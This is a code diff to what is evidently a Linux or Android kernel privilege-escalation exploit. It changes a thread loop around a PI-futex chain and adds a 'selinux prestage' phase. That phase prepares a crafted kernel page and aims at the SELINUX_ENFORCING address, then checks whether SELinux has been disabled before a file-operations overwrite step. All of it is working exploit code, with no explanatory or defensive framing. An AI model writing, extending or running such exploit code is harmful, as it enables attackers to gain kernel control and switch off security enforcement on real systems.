@@ -72,9 +72,10 @@ void *owner_thread(void *arg __attribute__((unused))) {
   futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
   atomic_store(&owner_chain_done, 1);
 
-  for (;;) {
-    sleep(1);
+  while (!atomic_load(&punch_consume_stop)) {
+    usleep(100000);
   }
+  return NULL;
 }
 
 void *consumer_thread(void *arg __attribute__((unused))) {
@@ -582,6 +583,26 @@ int run_exploit(int argc, char **argv) {
 #endif
 #endif
 #else
+  fops_selinux_prestage = 1;
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+  if (page_base) {
+    pr_info("selinux prestage phase1 base=%016zx lock=%016zx target=%016zx\n",
+            page_base, fake_lock, data_addr(SELINUX_ENFORCING));
+    run_main_route_threads();
+    atomic_store(&punch_consume_stop, 1);
+    usleep(200000);
+  } else {
+    pr_warning("selinux prestage page alloc failed; skipping to fops\n");
+  }
+
+  {
+    int se_ok = verify_selinux_disabled();
+    pr_info("selinux prestage result=%d step=%d\n", se_ok, cfi_last_step);
+  }
+
+  fops_selinux_prestage = 0;
+  pin_to_core(CORE);
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
   run_main_route_threads();
 #endif
 
